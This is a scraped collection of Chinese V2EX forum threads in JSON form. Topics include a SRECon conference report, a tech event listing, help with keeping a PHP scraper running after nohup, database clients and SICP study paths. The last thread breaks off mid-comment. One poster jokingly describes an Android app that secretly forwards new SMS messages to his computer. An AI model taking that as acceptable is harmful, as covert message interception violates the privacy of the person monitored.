{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>SRECon 第二天，还未倒过时差的我们早早就起身前往会场，幸亏提前预订了 Uber 门到门的接送，科技确实让生活更加便利。</p>\n</blockquote>\n<blockquote>\n<p>SRECon 紧凑的演讲信息量确实很大，回顾两天的会议内容我想给大家带来的 key words 就是 MTTR 、 MTTD 、 Automation 和 Communication 。</p>\n</blockquote>\n<blockquote>\n<p>PS ：手机照片拍的不美丽，莫怪......</p>\n</blockquote>\n<blockquote>\n<p>——来自 SRECon<a href=\"www.shurenyun.com\" rel=\"nofollow\">数人云</a>CTO 老肖</p>\n</blockquote>\n<p><img alt=\"\" src=\"https://i.v2ex.co/6041YZOz.jpeg\"></p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/84929l0H.jpeg\"></p>\n<p>——会场</p>\n<p>一大早就看到了本次的大会主席之一，来自谷歌的 Google SRE Manager ， Liz Fong-Jones 。赶紧掏出手机拍一张。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/H7894dr3.jpeg\"></p>\n<h2>Traps and Cookies</h2>\n<p>开篇 Session 题目是《Traps and Cookies》，内容很出乎意料。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/cA2p8DTP.jpeg\"></p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/OAT7bO2D.jpeg\"></p>\n<p>该 talk 围绕“避免让一些小小的技术债务成为工作中的雷区”展开，比如文档和运维习惯，算是一个以小见大的选题。从陷阱的角度来讲，就是不要自以为是地错误地运行命令。一定要看下文档，熟悉文档才能保证你的操作是正常操作，不会出错。</p>\n<p>演讲者 Tanya Reilly ，依然是一位来自 Google 的女性 SRE 。听 Google 的华人软件工程师说起有两位华人女性 SRE 在 Google 也做到了很高阶的职位，看来女性技术人员以后可以考虑往 SRE 方向发展。</p>\n<h2>Observability,in the Era of Cambrian Stack</h2>\n<p>演讲人是来自创业公司 <a href=\"http://honeycomb.io\" rel=\"nofollow\">honeycomb.io</a> 的创始人 Charity Majors ，之前曾在 Facebook 负责管理庞大的数据库集群。他介绍了从一个工程师的视角如何去看待如寒武纪爆炸一般的基础设施复杂性。在他看来系统必须是可观测的，我们可以通过工具来理解、探索和解释系统。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/I5ISdSao.jpeg\"></p>\n<p>可观测性文化的根基在于现在监控和时序图已经发展得非常成熟，但是我们需要具备的是排错能力。监控面板更多是为业绩 KPI 做准备的，这个观念是比较新颖的，反应了数据驱动的一个新境界，需要更多人能理解的数据和行为，排错活动成为一种社区活动。</p>\n<h2>Reducing MTTR and False Escalations</h2>\n<p>这次会议上出现频率很高的一个术语是 MTTR(平均维修时间)，来自 LinkedIn 的 Production-SRE Michael Kehoe 就此展开了讨论。</p>\n<p>在题为《Reducing MTTR and False Escalations: Event Correlation at LinkedIn》的演讲中， Michael Kehoe 提到 LinkedIn 的生产堆栈是由超过 900 个应用程序和超过 2200 内部 API 构成。为了防止错误扩散，需要把关键修复的时间缩短。但是服务越复杂，学习曲线越高， MTTR 就越长。那么 Linkedin 在解决这个问题上用了两个工具，一个是 Drilldown + Site-Stablizer 来做时间序列的指标分析，另一个工具是 inVisualize 。</p>\n<h2>Anomaly Detection in Infrequently Occurred Patterns</h2>\n<p>SRECon 唯一的中国讲师是来自百度的首席架构师王栋，之前在贝尔实验室和 Google 工作过多年，也带领百度 SRE 团队完成过许多重要的项目，是目前国内非常资深的 SRE ，他带来了一个比较专业的话题。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/1weu314W.jpeg\"></p>\n<p>王老师分享的题目为《Anomaly Detection in Infrequently Occurred Patterns》，讲的比较高深，主要场景是在春节这样突发的流量下，如何避免误报，漏报信息等，估计也只有百度有这个体量能做异常检查。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/g1v2jmQX.jpeg\"></p>\n<p>SRE 的解决办法都是在实际问题的基础之上提出方案，百度场景下提供的方案可以参考。</p>\n<h2>Building Real-time@Facebook</h2>\n<p>接下来， Facebook 的两位工程师介绍了 Facebook 如何搭建 Real-time 架构。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/6uZLBvHg.jpeg\"></p>\n<p>先是给出 2016 年以前的架构:</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/f0dl25CK.jpeg\"></p>\n<p>又给出了现在架构:</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/8W7jZ98K.jpeg\"></p>\n<p>为了实时系统的高可靠，架构师把订阅的业务逻辑放在了网关层。总结一下经验：先走走看，从大局出发来设计系统。</p>\n<h2>Chaos Engineering</h2>\n<p><img alt=\"\" src=\"https://i.v2ex.co/wXNJ2Ra7.jpeg\"></p>\n<p>个人特别感兴趣 Netflix 这个的经典 Chaos Engineering 话题。什么是 Chaos Engineering ，它是解决分布式系统的可靠性验证工具。据了解， Netflix 把这个概念发扬了光大。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/p131b5Df.jpeg\"></p>\n<p>实时的可视化工具看着也非常酷炫。从中我们可以知道，对于可靠性系统来说，可视化的数据展示是非常重要的能力， SRE 的工作大量在围绕以人为中心来解决问题，可视化数据是一个。</p>\n<h2>接下来的几个议题也都非常有意思</h2>\n<p><img alt=\"\" src=\"https://i.v2ex.co/1Ltkz2E0.jpeg\"></p>\n<p>这个话题是怎样在不靠谱的网络里面构建一个值得信任的网络。一般的网络都是在数据中心之间使用 VPN 来保障可用性，但是 VPN 的不靠谱是没法保障业务的。所以，本话题是去掉 VPN ，直接在架构层面来保证系统的信任。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/kLN52a3R.jpeg\"></p>\n<p>完全基于公网的条件，在架构上设计的更加稳定，保障系统之间是全自动的。自动化是一个重要关键词。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/o547hw4H.jpeg\"></p>\n<p>在《Killing Our Darlings: How to Deprecate Systems》的话题中，主张多沟通，防止不靠谱的事情发生，多沟通能解决很多客户的问题。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/uStlpAy1.jpeg\"></p>\n<p>发现一个 LinkedIn 开源项目（ AMBRY ）挺不错，是存储小多媒体文件的分布式文件系统的。 LinkedIn 用它每天存 1T 的数据，大概用了快一年了，已经存储了 300 多 T ，国内有需要的可以关注下。</p>\n<h2>写在最后</h2>\n<p>SRECon 紧凑的演讲信息量确实很大，回顾两天的会议内容我想给大家带来的 key words 就是 MTTR 、 MTTD 、 Automation 和 Communication 。</p>\n<p>在这里只能抓一些要点为大家放送，更多详尽内容可以一周后前往 SRECon 官网查看演讲 Slides 和视频。</p>\n<p>此次 SRECon 之旅也遇见了一些关注 SRE 领域的国内小伙伴，分别来自百度、华为等国内知名企业，数人云希望和业界的朋友们一起将 SRE 理念在国内进行传播并落地。</p>\n<h2>SRE 相关阅读：</h2>\n<p><a href=\"https://www.v2ex.com/t/347177#reply11\" rel=\"nofollow\">活动实录 | 京东金融 PE 谈如何颠覆应用运维认知</a></p>\n<p><a href=\"https://www.v2ex.com/t/342262#reply1\" rel=\"nofollow\">SRE ：文化传奇不完全指南？</a></p>\n<p><a href=\"https://www.v2ex.com/t/341836#reply0\" rel=\"nofollow\">SRE 第一课： New to an SRE team?</a></p>\n<p><a href=\"https://www.v2ex.com/t/343862#reply1\" rel=\"nofollow\">SRE 系列教程 | 基于时间序列数据的监控实践</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzA3MDg4Nzc2NQ==&amp;mid=2652134703&amp;idx=1&amp;sn=b0615f8bb07d5041116466649c6feb0b&amp;chksm=84d50d15b3a2840397e930a9029b89ad4621ce39b8439a24270b9ba18e0b71bc48e734726a3d&amp;scene=21#wechat_redirect\" rel=\"nofollow\">人永远不够用——在复旦大学分享 SRE 团队组织和管理 </a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzA3MDg4Nzc2NQ==&amp;mid=2652134473&amp;idx=1&amp;sn=898c93a63a851be85886a839da2d9f54&amp;chksm=84d50c73b3a2856522f1eac5ef833b2958619c3e475de66eb74ed004bfd8ecd6e125e1fa6a2b&amp;scene=21#wechat_redirect\" rel=\"nofollow\">SRE 系列教程 | 孙宇聪：来自 Google 的 DevOps 理念及实践（上）</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzA3MDg4Nzc2NQ==&amp;mid=2652134494&amp;idx=1&amp;sn=da91df6773462e53f1d6fdbbfa800d6c&amp;chksm=84d50c64b3a2857237b150981b81a2b4063be04b818e392ed87616ad7654253655aa1e760f59&amp;scene=21#wechat_redirect\" rel=\"nofollow\">SRE 系列教程 | 孙宇聪：来自 Google 的 DevOps 理念及实践（下）</a></p>\n</div></div>"], "reply": "1", "tittle": "SRECon Day2 | 管中窥豹：从小热点看 SRE 大文章", "comment": ["蚂蚁金服 sre 团队招人中，有兴趣的可以联系我内推"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>云和大数据撑起了每年 11 月的商业盛宴，再也没有一个时刻的商业变革会如此需要强壮的技术支撑。不快不准不坚强，怎能扛过大促紧张的日日夜夜？如何应对大促中的削峰平谷，如何精准地推送货品，如何避免库存超卖，如何在海量数据和高并发的应用场景中构建一个高可用的物流系统，这些经验和实践都带着电商技术人血的教训。因此这一次技术开放日，在谈论电商变革零售业之时，以电商经典场景和后端技术为切入点，由实际电商技术人来分享他们每一个价值破亿的架构实现。</p>\n<p>活动日期： 2017 年 3 月 25 日（周六）全天（前 200 名签到用户获赠午餐券）</p>\n<p>活动地点：北京市海淀区中关村南大街甲 56 号方圆大厦 2 层优客工场（近动物园）</p>\n<p>08:00 ～ 08:50\t 签到</p>\n<p>09:00 ～ 09:40\t 有赞在云上为了稳定所做的一些“小事” \t 林足雄</p>\n<p>09:40 ～ 10:20\t 混合云为电商大促保驾护航\t 叶仲华 UCloud 互联网事业部高级架构经理</p>\n<p>10:20 ～ 10:40\t 茶歇</p>\n<p>10:40 ～ 11:20\t 待定</p>\n<p>11:20 ～ 12:00\t 如何从 0 到 1 搭建弹性作业云 Elastic-Job-Cloud\t 高洪涛 当当网系统架构师</p>\n<p>12:00 ～ 13:30\t 午餐&amp;抽奖</p>\n<p>13:30 ～ 14:10\t 电商物流系统高可用架构</p>\n<p>14:10 ～ 14:50\t 秒速点位问题的五维立体监控系统</p>\n<p>14:50 ～ 15:30\t 智能的供应链——阿里智慧供应链中台 2.0\t 林杉 阿里巴巴天猫首席供应链业务架构师</p>\n<p>15:30 ～ 15:50\t 茶歇</p>\n<p>15:50 ～ 16:50\t 圆桌讨论</p>\n<p>16:50 ～ 17:00\t 合影&amp;抽奖</p>\n<p>报名可访问官网： <a href=\"http://beijing01.chinatechday.com/?v2ex\" rel=\"nofollow\">http://beijing01.chinatechday.com/?v2ex</a></p>\n</div></div>"], "reply": "1", "tittle": "中国技术开放日之电商后端技术大揭秘（免费报名）", "comment": ["已报"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前用 php cli 模式爬取一个网站内容，因为要执行很久，在 xshell 中输入：</p>\n<p>nohup php scrape.php &amp;</p>\n<p>回车后， php 继续执行，但是一关闭 xshell ，这个进程也就跟着结束了， nohup 这么脆弱吗？ Linux 小白不太懂，求好心 V2 们解答一下，或者有没有更好的让 php 常驻进程的命令？</p>\n</div></div>", "<div class=\"topic_content\">刚刚手上三台服务器测试了一下，其中两台服务器 xshell 右上角叉叉关闭了， nohup 进程继续执行，另外一台服务器 xshell 右上角叉叉关闭后， nohup 进程终止，但是如果在 xshell 中 exit 后，再右上角叉叉， nohup 进程却能继续存活，这是何解？三台服务器都是 centos 6.8</div>"], "reply": "27", "tittle": "想让 PHP cli 执行一个较长的任务， xshell 一关闭， nohup 也跟着退出了，怎么回事？", "comment": ["at ?", "screen / tmux", " 什么意思？", "2 楼 +1", "不可能，你先开 error_log 或者 coredump 把原因搞清楚", " echo 引起的进程崩溃 /", "用 Supervisor 守护进程，挂了它会尝试重启", "screen 。另外，如果就一台机器长时间在抓，不用高匿代理访问很容易被拉黑……", "不想麻烦的话就\r", "setsid nohup php scrape.php &", "dnf install screen", "<?php\r", "    // fork 一个 php 进程\r", "    $pid = pcntl_fork();\r", "    if ($pid < 0)\r", "        exit(' fork error. ');\r", "    else if ($pid)\r", "        exit(' I am the parent process ');\r", "    else {\r", "        // I am the child process\r", "        $sid = posix_setsid();\r", "        if ($sid < 0)\r", "            exit;\r", "        for($i = 0; $i <= 60; $i++) { \r", "            echo \"echo Hello world from PHP daemon.\".PHP_EOL;\r", "            sleep(5);\r", "        }\r", "    }\r", "\r", "\r", "\r", "使用 posix_setsid 是至关重要的一步了，上面的代码助你完成 php 脚本 daemon 的完成，不需要借助其他力量，注意骚年，不要搞成僵尸进程", "但是一关闭 xshell ，这个进程也就跟着结束了\r", "不肯能啊，我一直这样用，一般场景你这种做法就行了。是不是 PHP 自己报错了", "\r", "我才发现我和他操作终端时的一个细节不同：他是在当 shell 中提示了 nohup 成功后还需要按终端上键盘任意键退回到 shell 输入命令窗口，然后通过在 shell 中输入 exit 来退出终端；而我是每次在 nohup 执行成功后直接点关闭程序按钮关闭终端.。所以这时候会断掉该命令所对应的 session ，导致 nohup 对应的进程被通知需要一起 shutdown 。", " 教科书般的错误，你需要 2 次 fork 。。。参考这个： ", " 我手上另外两台服务器都可以 xshell 关闭后， nohup 继续执行，就这个装一样的 centos 6.8 系统， xshell 一关闭，马上就退出 php 进程，测试了好多次都是这样，必须把 xshell 挂起", "  yes ! I know ， 我直接从 posix_setsid 的手册下搞过来这段 code ，旨在告诉小朋友 setsid ，多谢指正，误导了不少好骚年", "这种建议 使用 supervisord 吧", "5L +1", "tmux", "nohup command & 后，需要敲回车退出到 bash 、然后再退出", " 我是这样做的，连按两次回车，直接右上角关闭 xshell ，然后那个 php 进程也立即终止了", "screen?", "这种需求有这么几种做法\r", "1. tmux/screen/byobu(简单）这些工具,可以吧你正在用的会话一直保持下去\r", "2. 使用 supervisor 这类守护进程工具，可以帮助你自己启动，或者重新启动程序(推荐）\r", "3. 自己实现 daemon 功能（参考 ", ")", " 两次 fork", " 翻了一下 unix 环境编程的 守护进程那一章，确实是进行了两次 fork ，不过中间有提到， System V 系统有人建议进行两次 fork ，以防止其获取终端控制。不过这似乎并不是必须的吧？", "screen", "pm2"]},
{"content": "", "reply": "目前尚无回", "tittle": "有大神带是一种什么感觉?", "comment": []},
{"content": "", "reply": "108", "tittle": "你们有没有为一个类或表取名发愁过？", "comment": [" 不做前端，不懂你说的东西，我以为是个可执行的 exe ，或者一个 htm 页面。其实觉得你这个东西放在一个网站上，点开链接使用会更方便的。", "  这个是 osx 中一个 alfred 上面用的工具包 workflow . 快捷键 全局调用. 比网页好呢.", " 好吧，既然你是用苹果的，那就再见了，我还是用百度去……", "这个。。。。我觉得还是自拟一套相关的规范", "有时挺纠结的 会去看大站的命名 看到也不是很合适的🙀", "一直不知道做 sap 的有没有这个烦恼", " 说事儿就好好说事儿，不用喷。做行业应用的人很多，不见得别人就是外行；也不是所有人都按和你一样的方式去做事。行业有现成的名词惯例则遵循惯例，没必要重新定义，比如「抬头」这个词，大家都叫抬头，没人说发票标题。\r", "\r", "你接触的行业应用多用拼音，是因为行业专家可以用拼音快速查找，在行业词没有准确对应词时很有用，对英文要求也不高。一个成功过的项目选了拼音命名，并不意味着拼音取名有普遍意义上的可读性啊，这是两回事儿。\r", "\r", "我们有一个 ERP ，数据表字段根本没有名字，建表的时候直接增加 a1, a2, a3, a4... a100 这样的字段，然后约定 a1 是唯一 id ， a37 是产地， a25 入库时间， a90~a97 是进价标价等金额相关数据。只要背下来现有的百来个对应关系，不会拼音也无所谓，认识阿拉伯数字就行，定位快，查找快，跨表跨系统字段完全统一。这是当时项目组的「惯例」。所以你看，惯例就是这样，有用，也有局限。增加新业务时常会出现：项目 A 里 a95 是实收金额，项目 B 里面 a95 里面是下游代理标价；两个系统最初设计时无关联，后期要改造系统让数据互通，想想这个字段会有多坑。", " 既然你说我喷了，那我继续再喷一次。前面说的计费系统，公司拿下单子之后，就派了一个项目经理驻地，所有开发人员都是在当地现招，大专生、应届生很多。 TMD 计费系统还是用 C 来写的，我真不敢相信五年以内 C 经验的开发人员写出来的代码，指针都搞不明白啊。你能要求他们用英文起好的名字么？我就是看不惯看不起用拼音命名的晋惠帝们，我在五百强外企看过中国程序员起的乱七八糟的英文名字，各种不和谐不统一，牛逼个屁啊"]},
{"content": ["<div class=\"topic_content\">需求\r<br>要能登陆注册\r<br>还有信息是发送到服务器然后服务器转发到客户端二\r<br>服务器应该用什么软件呢？</div>"], "reply": "目前尚无回", "tittle": "问 如何构建一个类似 qq 的程序", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>navicat 的做得真的是好,就是太贵了啊.\n有没有免费开源的.\n能支持 mac 的?</p>\n</div></div>"], "reply": "38", "tittle": "有什么免费的好用的数据库客户端?", "comment": ["Sequel Pro ... Mac Only ... 比 navicat 不知道强到哪里去了 ...", "楼下的基本不敢说话了", "应楼上之意，用 CMD", "mysql-front\r", "感觉好用。\r", "可能我的要求太低了吧", "同楼上 ", " ", "MySQL: MySQL WorkBench\r", "Oracle :SQL Developer\r", "都是对应数据库厂商出的客户端，很好用。\r", "但是你想要连接的到底是什么数据库呢？或者是想找一个通用的那种客户端？", " 支持 mysql 和 postgre 就行", "Sqlyog", "navicat 的结构同步和数据同步挺好用的. 不知道有没有脚本工具能做到一样的事情", "你都没有说是什么数据库。", "intellij 注册码满天飞", "mycli \r", "pgcli", "phpMyAdmin 最顺手\r", "\r", "jetbrains 的 datagrip ，虽然现在很简陋，感觉以他家的实力牛 x 是迟早的事", "datagrip\r", "\r", "mycli+1", "其实我觉得最好用的是 dbforge ，可惜没有 mac 版本，用 crossover 模拟过 也不好用", "DBeaver, 全平台支持，并支持 10 多种数据库", "说了这么多了还没人提到 DBeaver", "sqlectron  基于 Electron 的全平台客户端", "接上条, mac 需 with Wine", "adminer", "mysql", "MySQL   Sequel Pro\r", "PostgreSQL   pgweb", " 比 MySQL WorkBench 好在哪(´･_･`)", "命令行 mycli +1", "dbeaver, ", "Linux 下我用的 mysql workbench", "dbeaver + 1", "navicat 有个 9.0 lite 版，免费，除了建模功能都有，支持多种数据库，这是官方免费版，不是破解版，可永久使用。官网已经不提供下载了，但可以搜索到", "不说库谈客户端就是耍流氓", "我只知道 plsql", "adminer.php", " 上面说了的啊", " 说的是 mysql 还是 oracle 还是 hadoop 这些都不一样啊", "DBEdit 、 Navicat 、 HeidiSQL 、 phpMyAdmin", "dbeaver", " 轻 ... 简洁 ... 而且不污染系统 ... \r", "\r", "在大多数情况下我并不需要 MySQL WorkBench 那种大而全的工具 ... 这种又小又快的就很好 ..."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个金融专业毕业的编程小白，花了 5 个月刷完 SICP 并且完成几乎所有习题后（<a href=\"https://github.com/soulomoon/SICP\" rel=\"nofollow\">答案都放在 soulomoon/SICP</a>上，写得挺烂）觉得勉强进入了编程的世界了，并且同时在外包公司打杂学习有了一定的网络编程基础。<br>\n现在正在为了成为一个合格的 python 后端工程师，成功找到 python 后端的工作，现在面临两个选择：<br>\n1 重点继续刷 clrs ， csapp ，不啃完誓不罢休，再同时兼顾一下学习 python 和 flask 。<br>\n2 重点学习 python ，研究 flask ， dajongo 等流行框架的使用，再轻度学习一下简单常见的算法。<br>\n这两者该如何抉择？想听听大家的意见</p>\n</div></div>", "<div class=\"topic_content\">补充一点东西， 2016 年毕业后连 html 是啥都不懂，走去一家小外包公司写点 c#和一点前端,  \r<br>现在要想走出来，所以还是需要刷点砖头书吗？</div>"], "reply": "52", "tittle": "刷完 SICP 入门编程后应该如何继续学习", "comment": ["反正你不急着找工作，那就 1 吧。另外，不要把自己绑死在一门语言上。", "1", "clrs 有的啃了，习题全做的话，估计得几年。", "在看 CSAPP 。。准备看完这个再看 SICP 。。", "在刷一遍", "1", "1", "五个月吓尿", " 其实还是算有点急的， 主要是怕全部刷完用时比较久， \r", " 吓到我了，这么恐怖。。。 \r", "\r", " 以后有这个打算，但现在教我重刷的必然坑 哼《-  。-》\r", " - -／／尿频尿急。。。", " 加油啊 我之前是 csapp 和 sicp 一起看，看了 50 页的 csapp 然后就专注 sicp 荒废了 csapp 了，主要是再之前看了 code 编码的秘密，了解到了一点点硬件的小知识，觉得还是先补充一点抽象的编程思想好一点，现在准备回去吃回头草。。", " 我给你一点建议吧\r", "0. 不要迷恋经典\r", "1. 如果要看算法，其实没必要看算法导论，严蔚敏的数据结构就够了，其他算法需要的时候再看\r", "2. cdapp 是好书，适合当操作系统和组原教材，如果你要补计算机的基础可以看看\r", "3. 如果打算做一个程序员（而不是代码搬运工），你必须掌握的是 c 语言，幸运的是有 k&r 这本很棒的书（学 scheme 写解释器开拓一下视野可以，工作之后离这种东西最好远一点）\r", "4. 做 web 相关的工作，你应该找一本 http 相关的书看（ http 权威指南之类），不要盲目去学习框架\r", "5. 你需要提高看书速度", " 感谢指导啊， 看来 csapp 挺好的，也可以顺带学习 c 语言， http 简单的还懂点，关于刷书速度，没办法，我平时还要上班搬砖，你懂得外包公司诶。", "在准备看 SICP 中，如果看 CLRS 建议多刷刷 OJ", " 看 csapp 恐怕学不了 c 语言，但可以学会汇编😄", " 刚走出 sicp 里面的伪汇编的恐惧- -。。", " 所以没必要全做完，性价比很低，除非你是研究算法方向 PHD 。\r", "\r", "工作的话，数据结构和重要的算法设计的方法掌握就可以了。然后就是刷题\r", "\r", "Big-Oh Notations\r", "Proof Methods: Loop Invariant, Proof by Induction\r", "Complexity Analysis Methods: Iteration Method, Substitution Method, Master Method, Recursion Tree, Amortized Analysis\r", "Data Structures: Linked List, Stack, Queue, Heap, Hash Table, BST, B Tree, B+ Tree, AVL Tree, RB Tree, Disjoint Sets\r", "Sorting Algorithms:\r", "    O(nlog(n)): Quick Sort, Merge Sort, Heap Sort\r", "    O(n): Counting Sort, Radix Sort, Bucket Sort\r", "    O(n^2): Insertion Sort, Bubble Sort, Selection Sort\r", "Medians and Order Statistics\r", "Divide and Conquer\r", "Dynamic Programming\r", "Greedy Algorithms\r", "Graph Algorithms\r", "NP Completeness", "厉害， sicp 看得我头皮发麻， csapp 也是前面那些汇编，处理器的章节也是一度崩溃", "膜拜一下，我一直觉得 sicp 真的不适合作为入门书籍看。。。", "学金融的不去好好“骗”钱，来这里捣什么乱……", "学金融可以搞搞数学做量化，真的", "2 显然选 2", "显然是 2 ， Python 工程师用到算法和底层的地方很少吧", "学金融的搞毛 python 啊，既然搞 python ，为啥不做量化分析，搞毛后台开发啊，既然要搞后台开发， 为什么不选 java ，搞毛 python 啊", " 算法是何时何地都会用到的。底层在写 C extension 和优化性能的时候相当有用", "所以你一开始就应该拿 Python 入门，可以省时间。\r", "\r", "你现在应该刷 leetcode ，然后才是 CSAPP 。比起系统，算法的优先级更高。", "2 ，学好了赶紧换个正经公司干", " 这年头看 K&R 真的合适嘛… 这是不是也属于迷信经典的一种？之前读 21st Century C 就深有同感，现在学任何一门语言都是学一整套生态系统， 21st Century C 就会首先教你如何用 Makefile, linker, 用库什么的… 不过，我并不能算会写 C 语言，只是讨论下 :-)", "难道不是应该刷 TAOCP 吗🤓（千万别当真）", "急着找工作就选 2", " 👍  目前 Python 开发， 自学 Java 。 发现 Java 好啊", "刷书感觉要和实践结合吧，习题是一方面，感觉项目也挺重要", "显然你应该用 python 刷 SICP 的。", " 你说的有道理，但是我认为 k&r 并没有过时\r", "k&r 是一本很薄的书，真正介绍 c 语言的部分只有 100 页不到，但是覆盖了语言的各个方面， 100 页一俩个下午就可以看完了。很适合拿来入门和查阅\r", "一般说 k&r ，基本都是说第二版，实际介绍的是 ansi c ， c 语言从诞生到标准化变化很小，现在各个平台实现的最广泛的也是 ansi c ，所以我认为是入门是合适，也没有过时的，实际用的时候工具链更多的是一些操作系统的知识，如果真的要使用 c 语言工作，一本书肯定不够，这个时候就可以看看 apiu ， 21st Century C 之类的书\r", "\r", "举一个例子， lua 语言的解释器就是完全使用 ansi c 写的，现在仍活跃使用于游戏开发、嵌入式、机器学习等领域\r", "\r", "最后我对'迷信经典'的理解：重点在迷信，而不是经典。经典是好的，但是存在一个语境：'需要某本经典'。 po 主这样的情况，我认为阅读 sicp 的短期收益是比较小的，对找工作鲜有帮助而耗费很多精力，所以目前阶段为了达到 po 的目的，可能需要更加适合的经典\r", "\r", "'君之楚，将奚为北面？'—— sicp 也许就是那辆跑的很快的马车", "我擦，好毅力，我之前看 algs 两个月已经很烦躁了。\r", "另外， csapp 是好书", "好想改行干金融，该怎么入门？", "羡慕金融毕业的，干嘛要来做码农。。虽然我同学做金融的平时也都在写代码，但是他们赚得多啊！别做什么后台开发了，还不好好地去做金融！ [滑稽", "同不理解，为何不搞金融要来当码农？金融里也有编程职位啊。", "首先非常感谢大家的回复\r", "  非常感谢对学习数据结构和重要的算法设计的方向指导，我会 mark 下来。\r", "\r", " 我也是想从 python 入门的，但仅仅是尝试，写 console ， 21 点小游戏之类的。尝试去进一步入门，之后也尝试跟着 CS61 的 python 版的 SICP 学过，但是有一个严重的问题，就是它的习题量太少，对于我来说，学过就忘了。只好尝试去学原版。\r", "\r", "@感谢支持选 2 的回复，确实这更加现实和容易走一点。\r", "\r", " @", " 感谢你们的讨论，又让我学到了一些东西\r", "\r", " 刷书和实践一起食用，效果更加，刷过 SICP 后，对程序的组成，逻辑的走向，有了更好的理解，工作阅读和写 C#的程序时也可以慢慢看出写法的优劣，也有了更清晰的思路去组织代码和复用代码。例如关于书里抽象隔离的部分让我能很快就理解依赖注入之类的设计模式的原理。\r", "\r", "关于不选择做金融， 1 不敢兴趣， 2 没有资源, 3- -别再逼我了，我投降┗( T﹏T )┛还不行？。。", "厉害… SICP 什么的看的一头雾水", " 我不烦操是因为我同时还在体验很多其他的东西，\r", "例如折腾电脑系统，刷了一个有一个的系统，体验 ubuntu 和 fedora 的使用后果断装上 macOS, 其实电脑里一共装了 3 个系统， windows （工作使用）， linux （ fedora ）， macOS （装逼+因为对多屏幕异分辨率的支持真的很好）。所以即使工作是在 windows 学到了一点基本的 bash shell 的知识。\r", "还搭了自己的 VPS 来玩，墙外的大世界, 看到我目瞪口呆。\r", "玩了一下很火的几个前端框架和 nodeJS ， docker 之类的（跟 tutorial 写 demo ）。还不务正业的去搞一点 Axure- -。。\r", "还写一个专门把新短信偷偷发送到自己电脑的安卓 app ， python 端服务器接收（ ps 绝对不是专门监听女朋友)（加上了 selenium 用手机发送到被监听手机，然后 pc 端接收到信息去 google 相应的网页）[绝壁没有用的功能]", " cs61 那个不是少，而是没有。\r", "\r", "可以拿 python 做 sicp 的习题， scheme 和 py 都是多范式语言，没啥不可行的。", " 不好意思 typo ，更正\"不耐烦\"，\"没有不耐烦\"", "现在都入门都这么凶残了？直接 SICP ？", " \r", "有习题的，课后作业就是- -。。\r", "冒昧问一句，你真的有刷过书里的习题吗？。。。。，\r", "一开始我也有想过这点， 用 python 去完成习题，但是\r", "书里的习题很多是以文中的代码为基础的，让你增加，改写功能的，特别是到了第四第五章的习题，需要大量的 load 代码。除此外，某些再加上， symbol 的 quote 和 unquote ， s 表达式等等特性。\r", "几乎书里所有的代码都会在习题中用到，想一想，除了翻译过去耗费的绝大时间，\r", "作为新手的我更没有能力去把 scheme 的特性全部都翻译到 python 上 0 0 。\r", "scheme 语法简单，于是这糖我也就吃了。", " SICP 是以前 MIT 的入门教材吧，虽然貌似现在改成 python 入门了。", "不过话说回来，还是金融好赚钱，金融的有了几年经验，分分钟赚码农一年的钱，为什么要转呢？", " 金融要后台背景和实力，否则进一般的小公司或银行保险之类的，基本就废了", "金融行业不是挺好的么，为什么想转啊", " 所言正是, \r", "  当你到柜台看到那里的阿姨们， 你就看到自己的未来了。而且还有一点非常重要，当你不喜欢一个妹纸的时候，她再漂亮又有什么用。- -//", "千万别刷 这些只是看看了解下原理就可以了 直接看拉钩招聘 选你对应的职位看要求进行学习 你这样有点浪费时间 后期补就行 肺腑之言", "我觉得 SICP 这书吧，你刷了之后真没什么多大用。", ",为什么这么说？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>面试已过，答应的薪资比正常 P5 低 1K ，五险一金是比较低，这个有没有坑？加班会不会比较严重？有谁有类似经历吗？</p>\n</div></div>", "<div class=\"topic_content\">补充一下，中软外派到 UC 的有 70+人了。\r<br>这个广州中软好像和其他其实中软不一样，不是培训的。面试的时候也是去 UC 总部面试，面试官都是 UC 的。\r<br>\r<br>问题是现在 UC 正式社招好像只招 P6 ，然而自己还没到 P6 水平，估计只在 P5 左右浮动（听中软 HR 说面试官评的是接近 P5 ，不知道有没有骗我的成分）。\r<br>所以想着通过中软进去 UC ，起码离 UC 近点，以后可以获得更多信息，早点转正。\r<br>\r<br>最后我听说中软和 UC 签了互不挖角协议，就是假如去中软后，过几个月在 UC 转正了。 UC 就要赔 2 个月工资给中软。\r<br>\r<br>所以担心转正有点困难。</div>"], "reply": "34", "tittle": "中软国际外派阿里 UC 做前端靠谱吗？", "comment": ["震惊了！！！", "中软国际这公司挺有名的，嗯。。。", "我有同学外派到了腾讯。。结果是做客服", "震惊.", "中软国际：培训机构+人力外包。呵呵一家公司", "中软国际，中字头的公司，应该挺厉害的，而且应该是个全球业务的公司吧。", "我感觉你既然是外派就别考虑不加班的事儿了. 到哪都得加班.", "面试过了，竟然没有让你参加培训，说明楼主还是有一定实力的，有实力干嘛非要去这种外包公司？薪资看起来只比别人少 1k ，但是福利啥的全都没。", "只能说一句：兄弟，珍重。", " 嗯嗯嗯，是去 UC 总部面试的，面试也是 UC 的正式员工，面试过程中没去过中软（只是电话微信和中软 HR 沟通）。\r", "主要是想通过中软进去 UC 